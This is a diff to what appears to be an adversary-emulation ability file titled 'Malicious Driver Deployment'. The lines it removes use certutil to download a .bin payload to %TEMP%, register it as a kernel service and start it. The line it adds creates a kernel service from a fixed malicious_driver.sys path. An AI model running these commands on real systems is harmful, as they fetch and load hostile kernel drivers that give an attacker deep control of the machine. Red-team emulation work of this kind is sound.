@@ -1,6 +1,6 @@
 - id: 981210cb-8b84-4d37-b46e-b71059b8c438
-  name: 47960eb7affa4987ebed6193b0a636b9 - Malicious Driver Deployment
-  description: 'Malicious driver: 47960eb7affa4987ebed6193b0a636b9
+  name: 981210cb-8b84-4d37-b46e-b71059b8c438 - Malicious Driver Deployment
+  description: 'Malicious driver: 981210cb-8b84-4d37-b46e-b71059b8c438
 
     Category: vulnerable driver
 
@@ -16,12 +16,8 @@
   platforms:
     windows:
       cmd:
-        command: 'certutil.exe -urlcache -split -f #{{47960eb7affa4987ebed6193b0a636b9.bin}}
-          %TEMP%\47960eb7affa4987ebed6193b0a636b9.bin && sc create MaliciousDriver
-          binPath= "%TEMP%\47960eb7affa4987ebed6193b0a636b9.bin" type= kernel && sc
-          start MaliciousDriver'
-        payloads:
-        - 47960eb7affa4987ebed6193b0a636b9.bin
+        command: sc create MaliciousDriver binPath= "C:\Windows\System32\drivers\malicious_driver.sys"
+          type= kernel
   singleton: true
   privilege: Elevated
   repeatable: false
